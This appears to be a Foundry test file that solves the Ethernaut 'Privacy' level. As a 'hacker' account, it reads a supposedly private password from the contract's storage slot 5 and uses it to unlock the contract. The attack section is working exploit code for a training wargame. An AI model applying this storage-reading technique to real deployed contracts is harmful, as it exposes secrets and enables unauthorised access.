// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/12-Privacy/PrivacyFactory.sol";

contract PrivacyTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testPrivacyHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // slot 0 -> locked
        // slot 1 -> ID
        // slot 2 -> flattening, denomination, awkwardness
        // slot 3 -> data[0]
        // slot 4 -> data[1]
        // slot 5 -> data[2]
        bytes32 password = vm.load(address(ethernautPrivacy), bytes32(uint256(5)));
        emit log_named_bytes32("The password is ", password);
        ethernautPrivacy.unlock(bytes16(password));
        assertTrue(!ethernautPrivacy.locked(), "still locked!");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
